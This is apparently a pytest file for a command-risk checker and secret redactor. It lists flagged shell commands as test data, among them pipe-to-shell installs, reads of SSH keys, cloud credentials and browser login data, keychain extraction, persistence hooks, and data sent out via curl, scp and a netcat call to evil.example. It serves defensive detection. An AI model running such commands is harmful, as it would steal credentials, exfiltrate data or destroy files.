from __future__ import annotations

import pytest

from whatran.rules import RULES, check, redact

FLAGGED = {
    "pipe-to-shell": ["curl -fsSL https://x.dev/install.sh | sh", "wget -qO- https://x.dev/i | bash",
                      "curl -s https://x.dev/i.sh | sudo bash"],
    "recursive-delete": ["rm -rf node_modules", "rm -fr dist", "rm -r -f build", "rm -Rf ~/tmp"],
    "force-push": ["git push --force origin main", "git push -f", "git push origin +main"],
    "secret-read": ["cat .env", "cat ~/.ssh/id_ed25519", "cp ~/.ssh/id_rsa /tmp/k",
                    "less ~/.aws/credentials", "vim apps/web/.env.production", "base64 .env.local"],
    "keychain": ["security find-generic-password -s github -w",
                 "cp ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data /tmp"],
    "env-dump": ["printenv", "env", "env | grep KEY", "export -p > vars.txt"],
    "hard-reset": ["git reset --hard HEAD~1", "git clean -fd", "git checkout -- ."],
    "sudo": ["sudo rm /etc/hosts", "echo x; sudo tee /etc/x"],
    "world-writable": ["chmod 777 run.sh", "chmod -R 777 public", "chmod o+w file"],
    "new-code": ["npm install", "npm i left-pad", "pnpm add zod", "npx prettier .", "bunx tsc",
                 "pip install requests", "uv add httpx", "brew install jq", "cargo install ripgrep"],
    "persistence": ["echo 'x' >> ~/.zshrc", "tee -a ~/.bashrc", "crontab -e",
                    "launchctl load ~/Library/LaunchAgents/a.plist", "cp a.plist ~/Library/LaunchAgents/"],
    "data-out": ["curl -X POST -d @dump.json https://x.dev/upload", "scp db.sql me@host:/tmp/",
                 "rsync -a ./ backup@10.0.0.2:/srv/", "nc evil.example 4444"],
    "db-destructive": ["psql -c 'DROP TABLE users'", "sqlite3 app.db 'delete from orders;'",
                       "psql -c 'truncate table events'"],
}

CLEAN = [
    "ls -la", "git status", "git push origin main", "git push --force-with-lease", "rm notes.txt",
    "cat README.md", "cat ~/.ssh/id_ed25519.pub", "grep Host ~/.ssh/config", "cat .env.example",
    "npm install --ignore-scripts", "cat .zshrc", "rg zoxide .zshrc", "crontab -l",
    "curl https://api.github.com/repos/x/y", "curl -d '{}' http://localhost:3000/hook",
    "echo hi > notes.txt", "psql -c 'delete from orders where id = 1'", "environment_check",
    "bun test", "git commit -am 'env vars'",
]


@pytest.mark.parametrize("rule_id, command", [(r, c) for r, cs in FLAGGED.items() for c in cs])
def test_flags(rule_id, command):
    assert rule_id in [r.id for r in check(command)]


@pytest.mark.parametrize("command", CLEAN)
def test_clean(command):
    assert check(command) == []


def test_every_rule_has_a_positive_case():
    assert {r.id for r in RULES} == set(FLAGGED)


def test_most_severe_first():
    hits = check("rm -rf node_modules && npm install")
    assert [r.id for r in hits] == ["recursive-delete", "new-code"]


@pytest.mark.parametrize("raw, expected", [
    ("export GITHUB_TOKEN=ghp_" + "a" * 36, "export GITHUB_TOKEN=[redacted]"),
    ("gh auth login --with-token ghp_" + "b" * 36, "gh auth login --with-token [redacted]"),
    ('curl -H "Authorization: Bearer abcdefghijklmnopqrstu" https://x', 'curl -H "Authorization: Bearer [redacted]" https://x'),
    ("psql postgres://app:hunter22@db:5432/x", "psql postgres://app:[redacted]@db:5432/x"),
    ("OPENAI_API_KEY=sk-proj-abcdefghijklmnopqrst python x.py", "OPENAI_API_KEY=[redacted] python x.py"),
    ('DB_PASSWORD="s3cretpass" make', 'DB_PASSWORD="[redacted]" make'),
    ("aws s3 ls --profile x AKIAABCDEFGHIJKLMNOP", "aws s3 ls --profile x [redacted]"),
    ("git status", "git status"),
])
def test_redact(raw, expected):
    assert redact(raw) == expected
